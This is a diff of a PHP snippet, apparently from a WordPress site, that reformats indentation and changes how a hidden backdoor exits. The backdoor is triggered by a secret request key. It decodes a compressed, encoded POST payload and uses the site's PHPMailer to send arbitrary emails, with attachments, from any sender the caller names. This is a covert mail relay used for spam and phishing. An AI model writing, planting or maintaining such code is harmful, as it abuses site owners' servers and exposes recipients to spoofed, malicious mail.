@@ -1,48 +1,49 @@
 if (@$_REQUEST["_k"] == "INSERT_KEY") {
-    ini_set("post_max_size", "256M");
+	ini_set("post_max_size", "256M");
 
-    global $phpmailer;
+	global $phpmailer;
 
-    if ( ! ( $phpmailer instanceof PHPMailer ) ) {
-        require_once ABSPATH . WPINC . "/class-phpmailer.php";
-        require_once ABSPATH . WPINC . "/class-smtp.php";
-        $phpmailer = new PHPMailer( true );
-    }
-    
-    $phpmailer->CharSet = "UTF-8";
-    $phpmailer->isHTML(true);
-    
-    $rawjson = gzuncompress(base64_decode($_POST["j"]));
-    $json = json_decode($rawjson, true);
-    $out = array();
+	if ( ! ( $phpmailer instanceof PHPMailer ) ) {
+		require_once ABSPATH . WPINC . "/class-phpmailer.php";
+		require_once ABSPATH . WPINC . "/class-smtp.php";
+		$phpmailer = new PHPMailer( true );
+	}
+	
+	$phpmailer->CharSet = "UTF-8";
+	$phpmailer->isHTML(true);
+	
+	$rawjson = gzuncompress(base64_decode($_POST["j"]));
+	$json = json_decode($rawjson, true);
+	$out = array();
 
-    foreach ($json as $m) {
-        $from = explode("|", $m["m_f"]);
-        $to = $m["m_t"];
-        $subject = $m["m_s"];
-        $htmlbody = $m["m_hb"];
-        $plainbody = $m["m_pb"];
-        $attachment = $m["m_a"];
+	foreach ($json as $m) {
+		$from = explode("|", $m["m_f"]);
+		$to = $m["m_t"];
+		$subject = $m["m_s"];
+		$htmlbody = $m["m_hb"];
+		$plainbody = $m["m_pb"];
+		$attachment = $m["m_a"];
 
-        $phpmailer->ClearAllRecipients();
-        $phpmailer->ClearAttachments();
-        $phpmailer->ClearCustomHeaders();
-        $phpmailer->ClearReplyTos();
-        $phpmailer->SetFrom($from[0], $from[1], false);
-        $phpmailer->Sender = $from[0];
-        $phpmailer->AddAddress($to);
-        $phpmailer->Subject = $subject;
-        $phpmailer->Body = $htmlbody;
-        $phpmailer->AltBody = $plainbody;
-        if (null !== $attachment) {
-            $phpmailer->AddStringAttachment(base64_decode($attachment["c"]), $attachment["n"], "base64", $attachment["t"]);
-        }
-        if (!$phpmailer->Send()) {
-            $out []= array("a" => $to, "r" => $phpmailer->ErrorInfo);
-        } else {
-            $out []= array("a" => $to, "r" => "OK");
-        }
-    }
+		$phpmailer->ClearAllRecipients();
+		$phpmailer->ClearAttachments();
+		$phpmailer->ClearCustomHeaders();
+		$phpmailer->ClearReplyTos();
+		$phpmailer->SetFrom($from[0], $from[1], false);
+		$phpmailer->Sender = $from[0];
+		$phpmailer->AddAddress($to);
+		$phpmailer->Subject = $subject;
+		$phpmailer->Body = $htmlbody;
+		$phpmailer->AltBody = $plainbody;
+		if (null !== $attachment) {
+			$phpmailer->AddStringAttachment(base64_decode($attachment["c"]), $attachment["n"], "base64", $attachment["t"]);
+		}
+		if (!$phpmailer->Send()) {
+			$out []= array("a" => $to, "r" => $phpmailer->ErrorInfo);
+		} else {
+			$out []= array("a" => $to, "r" => "OK");
+		}
+	}
 
-    die(base64_encode(json_encode($out)));
+	echo base64_encode(json_encode($out));
+	if ('.inc' === basename(__FILE__)) { throw new Exception('die'); } else { die(); };
 }
